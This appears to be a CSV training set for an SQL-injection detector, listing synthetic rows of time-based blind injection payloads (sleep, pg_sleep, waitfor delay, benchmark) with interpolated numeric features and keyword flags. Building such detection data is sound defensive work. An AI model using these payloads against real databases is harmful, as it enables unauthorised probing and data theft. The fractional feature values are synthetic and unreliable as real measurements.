id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000030,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R001068,0.3219035464011867,49.215012311837555,20.513995075264976,3.7594233627038816,28.0,1.0,13.972009849470044,6.243002462367512,0.5699605563162533,0.0203557341541519,0.28296435248454166,0.12671935704505316,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.2430024623675116,0.0,1.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,time,select sleep  (  5  )  #,nearest_attack_euclidean,R000271,0.33380879152211035,24.848124537723244,11.282708179241078,2.8880498280699087,10.85864591037946,1.14135408962054,9.706770448102699,3.141354089620539,0.44066407213076575,0.04520051890718017,0.3879574582152162,0.12617795074683782,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.14135408962054,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.8586459103794598,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.85864591037946
SMOTE_000032,attack,time,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000469,0.6321128563889703,84.04538353117593,22.674230588529323,3.06958088042116,28.0,2.0,41.696922354117284,12.348461177058642,0.3335362298149817,0.023824016415355836,0.4959278823566165,0.14671187141304595,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.674230588529321,0.6742305885293209,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000033,attack,time,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000667,0.058414659407971456,62.17940541683554,15.039867870407898,2.5058768024706133,10.980066064796052,2.0,36.15947148163159,13.039867870407898,0.17669028542302687,0.032176553649779394,0.581424042902108,0.2097091180250858,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.039867870407898,2.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.980066064796051,0.01993393520394887,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000034,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,nearest_attack_euclidean,R000835,1.1069920216105598,124.58454607943969,25.16909215887937,3.1154011796248264,42.58454607943968,2.0,63.0,17.0,0.34180211474284217,0.016053606957491653,0.5056886191609871,0.13645565913867905,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,12.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.5845460794396842,0.41545392056031555,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000035,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,0.46420723608585657,82.34310697089165,26.542888371361457,3.632320733162713,31.01918294256631,10.0,32.62866511408437,8.69525891424097,0.3744049518044408,0.12313745879427673,0.3965490552889984,0.10590853411228407,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.847629457120485,0.0,1.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.8476294571204852,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000295,0.1169341642762536,106.63072053192272,28.817429404256362,3.7393705368350734,26.452288212769087,29.0,41.26971761702545,9.908714702128181,0.2477914847289076,0.2724720335099802,0.3867621704796888,0.09297431128142336,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.908714702128181,0.0,0.0,1.0,2.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000296,0.9147731281430492,150.9183096821628,30.583661936432563,3.9516647470009683,65.0,19.583661936432563,49.75098580929769,16.583661936432563,0.43081212995316276,0.1297444834230227,0.3295825399678609,0.10986084665595364,2.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,8.0,0.0,0.0,0.583661936432561,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000038,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,nearest_attack_euclidean,R001106,0.4392864243275824,68.83372735860584,25.16627264139416,3.561863691066044,23.83372735860584,10.0,28.0,7.0,0.34623140049813783,0.14528191100041382,0.4067893508011587,0.10169733770028967,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,1.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8337273586058412,0.16627264139415876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,0.5274919194705786,60.889127046376395,23.042808321961967,3.426425990354285,18.042808321961967,10.0,26.085616643923935,6.760702080490492,0.29621517117782303,0.16578086076477822,0.4266494815908679,0.11135448646653086,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.760702080490492,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7607020804904919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.760702080490492
SMOTE_000040,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",nearest_attack_euclidean,R000584,0.3918128930213104,106.986891100592,25.3013108899408,3.3493166441087516,42.0,2.0,48.5895128804736,14.3973782201184,0.3933227794341033,0.01872965616352873,0.4535013609747185,0.13444620342764946,0.0,3.9999999999999996,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,9.3973782201184,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000041,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000713,0.5852419660660063,97.18688678936363,28.60934433946818,3.6291633132463463,28.65606603680909,18.0,40.31213207361818,10.218688678936363,0.29480038581453016,0.18718611067691368,0.4128138893230863,0.10519961418546983,0.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.218688678936363,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000042,attack,time,1 and sleep  (  5  )  # qcyj,nearest_attack_euclidean,R000589,0.3537089248198375,28.14690356547574,16.559289303572776,3.355249419657737,12.440710696427226,1.8530964345242582,10.85309643452426,2.999999999999999,0.4415973604855338,0.06600109979769425,0.38580142973700254,0.10660010997976942,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.14690356547574202,0.0,0.0,0.0,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,time,1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',nearest_attack_euclidean,R000331,0.49955353971163663,125.56477685776541,29.435223142234594,3.470842208102481,43.56477685776541,10.0,56.0,16.0,0.34691727258814253,0.07964423505022653,0.4460077162812685,0.12743077608036243,2.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,10.0,0.0,0.0,0.0,4.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.717611571117297
SMOTE_000044,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,0.14835878616544063,83.87405021950991,21.0,3.0193524877606324,30.0,2.0,41.099240175607925,10.774810043901981,0.35790860197275043,0.02386057346485003,0.4898125449569497,0.12841827960544994,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.774810043901983,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000045,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000397,0.9355989368649688,85.39877516782441,25.601224832175596,3.4877749929291624,21.0,18.0,36.0,10.398775167824404,0.24591323139202292,0.21078276976459107,0.42156553952918213,0.12173845931420388,0.0,0.3987751678244047,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,0.0,1.0,4.0,0.0,0.3987751678244047,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.42404287260633344,29.441878752592643,14.0,2.989093285935077,9.554822500740755,2.0,13.10964500148151,4.777411250370378,0.3249740725766626,0.06870462700915955,0.44383426412584653,0.1624870362883313,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.777411250370378,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22258874962962205,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.222588749629622
SMOTE_000047,attack,time,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000777,0.3897419135777071,94.58884178910887,30.0,3.754796984619116,27.69163134183165,18.0,37.89721044727722,11.0,0.29195442417348855,0.19063168473704523,0.40091675041682745,0.11649714067263875,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000048,attack,time,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",nearest_attack_euclidean,R000174,0.6588737188959558,108.58962802684087,25.30129649664489,3.3573171198397134,43.60259299328978,2.0,48.58962802684087,14.397407006710218,0.4023033164612095,0.018439669723285076,0.4468099083014478,0.13244710551405767,0.0,3.9999999999999996,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,9.397407006710218,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.6987035033551086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.698703503355109
SMOTE_000049,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000787,0.21293373897102433,83.63088482795564,24.0,3.152178821149083,30.0,2.0,40.30470786236451,11.326176965591127,0.35899543806578793,0.023933029204385864,0.48169071158166804,0.1353808211481582,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.326176965591127,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000050,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.5791247741974851,45.820875075754614,19.0,3.411835087930678,14.452749949496923,10.0,17.094500101006155,4.273625025251539,0.31623176925511215,0.21842187464928417,0.3722770848764829,0.09306927121912073,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.273625025251539,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2736250252515386
SMOTE_000051,attack,time,"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R001177,0.09824434939693741,108.2460006582083,31.89228580831547,3.8225980029679256,27.0,29.0,41.35371484989283,10.89228580831547,0.24953750514736248,0.26802176478790785,0.3818333235288334,0.10060740653589631,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.892285808315472,0.0,0.0,1.0,2.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,time,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000777,0.5353969409760991,97.89850646936208,30.459900431290805,3.6973115859155885,27.75940258774483,18.0,40.67920345032644,11.459900431290805,0.2828781851286261,0.18492918137585346,0.4148416726739902,0.11735096082153021,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.459900431290805,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000053,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,0.004078752126463113,42.00496704382104,19.0,3.386643415954124,12.0,4.0,17.0,9.004967043821038,0.28568128210085686,0.09522709403361895,0.4047151496428806,0.21437647422264353,2.004967043821037,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,3.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,time,1 and sleep  (  5  ) ,nearest_attack_euclidean,R001131,0.04926740018028832,21.038945808653196,12.019472904326598,2.939586687034744,8.000000000000002,2.0,9.019472904326598,2.019472904326598,0.3803073157987048,0.0950768289496762,0.4286923782877428,0.09592347696387614,0.0,0.01947290432659876,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,0.01947290432659876,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,time,1 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000316,0.0878263135432923,25.303500159553423,13.182100095732054,3.0632034586895003,10.242800127642738,2.0,10.060700031910685,2.999999999999999,0.40404666879404566,0.07919066624119088,0.39797666560297723,0.1187859993617863,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000056,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,0.5251721279049619,60.90280797033591,23.047017837026434,3.4264667401372426,18.04701783702643,10.0,26.094035674052865,6.761754459256608,0.296218072957509,0.165738946169314,0.426697199745704,0.1113457811274729,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.7617544592566086,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7617544592566082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.761754459256608
SMOTE_000057,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,0.17323201000481558,99.06596486013888,26.0,3.608701163021797,25.06596486013888,18.0,39.0,17.0,0.2530183231969977,0.1816982457088384,0.3936795323691498,0.17160389872501403,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,6.0,0.0,0.0,1.0,6.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.9999999999999999,1.0,0.0,1.0,0.0,0.06596486013888148,0.9340351398611186,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R001159,1.1111598186834697,101.80978102270183,29.550611313918864,3.789564673300412,23.303667883513185,29.0,38.404890511350914,11.101222627837728,0.22798120673894542,0.2866248742568459,0.37645479557894573,0.10893912342526295,0.550611313918864,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.550611313918864,0.0,0.0,1.0,4.0,0.5506113139188641,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000059,attack,time,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R001027,0.8666431260972515,66.28842967279071,18.38140494546512,2.7820170280384104,10.999999999999998,10.0,35.52561978186048,9.762809890930239,0.1662560878569871,0.15114189805180644,0.5356770216884343,0.14692499240277207,0.3814049454651195,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.381404945465119,0.0,0.0,1.0,1.0,0.3814049454651196,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
